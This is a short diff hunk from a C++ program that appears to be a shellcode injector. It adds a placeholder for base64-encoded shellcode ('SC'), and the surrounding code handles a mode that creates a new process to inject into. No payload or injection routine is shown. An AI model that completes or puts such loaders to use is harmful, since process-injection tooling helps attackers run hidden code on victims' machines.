@@ -58,8 +58,8 @@ int main(int argc, char** argv)
 		}
 	}
 
-	// HANDLE MODE ARGUMENT
-	char* modeStr = argv[1];
+	// IMPORTANT! BASE64 ENCODED SC GOES HERE
+	string encodedBytes = "";
 	char* argString = argv[2];
 	if (strcmp(argv[1], "PID") == 0) {
 		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
